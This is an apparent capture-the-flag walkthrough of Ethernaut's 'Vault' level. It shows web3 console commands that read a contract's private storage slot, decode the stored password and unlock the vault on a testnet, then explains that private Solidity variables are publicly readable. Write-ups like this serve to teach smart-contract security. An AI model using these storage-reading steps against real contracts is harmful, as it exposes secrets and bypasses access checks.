## Ethernaut-solution

### 8.Vault 

Unlock the vault to pass the level!

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Vault {
  bool public locked;
  bytes32 private password;

  constructor(bytes32 _password) public {
    locked = true;
    password = _password;
  }

  function unlock(bytes32 _password) public {
    if (password == _password) {
      locked = false;
    }
  }
}
```
```
>contract
n {methods: {…}, abi: Array(3), address: '0x97E95179608562E7Afa3d66d3Be7a588171E06b5', transactionHash: undefined, constructor: ƒ, …}
```
```
>contract.abi
(3) [{…}, {…}, {…}]
0: {inputs: Array(1), stateMutability: 'nonpayable', type: 'constructor', constant: undefined, payable: undefined}
1: {inputs: Array(0), name: 'locked', outputs: Array(1), stateMutability: 'view', type: 'function', …}
2: {inputs: Array(1), name: 'unlock', outputs: Array(0), stateMutability: 'nonpayable', type: 'function', …}
length: 3
[[Prototype]]: Array(0)
```
```
>await contract.locked()
true
```
```
>contract.address
'0x97E95179608562E7Afa3d66d3Be7a588171E06b5'
```
```
>var pwd
undefined
```
```
>web3.eth.getStorageAt(contract.address, 0, function(err, result) { pwd = result })
```

//0 is boolian value 'locked'
```
Promise {<pending>}
```
```
>pwd
'0x0000000000000000000000000000000000000000000000000000000000000001'
```

//passsword取得してしまおう
```
>web3.eth.getStorageAt(contract.address, 1, function(err, result) { pwd = result })
```
//1 is password 
```
Promise {<pending>}

>pwd
'0x412076657279207374726f6e67207365637265742070617373776f7264203a29'

>web3.utils.toAscii(pwd) //strong encryption 
'A very strong secret password :)'
```

//unlockするのにガス代払ってunlock完了
```
>await contract.unlock(pwd)
e4e9b69aea3571538dca60595571493ed3b7d30d.js:1 ⛏️ Sent transaction ⛏ https://rinkeby.etherscan.io/tx/0xa96592a61f5a92b6f8240ce60612109cf22f05e0d2644fe8f9d88c88f0d9cf29
e4e9b69aea3571538dca60595571493ed3b7d30d.js:1 ⛏️ Mined transaction ⛏ https://rinkeby.etherscan.io/tx/0xa96592a61f5a92b6f8240ce60612109cf22f05e0d2644fe8f9d88c88f0d9cf29
{tx: '0xa96592a61f5a92b6f8240ce60612109cf22f05e0d2644fe8f9d88c88f0d9cf29', receipt: {…}, logs: Array(0)}
```
```
>await contract.locked()
false
```


Its important to remember that marking a variable as private only prevents other contracts from accessing it. 
State variables marked as private and local variables are still publicly accessible.

To ensure that data is private, it needs to be encrypted before being put onto the blockchain. 
In this scenario, the decryption key should never be sent on-chain, as it will then be visible to anyone who looks for it. 
zk-SNARKs provide a way to determine whether someone possesses a secret parameter, without ever having to reveal the parameter.

## references

https://blog.ethereum.org/2016/12/05/zksnarks-in-a-nutshell/
















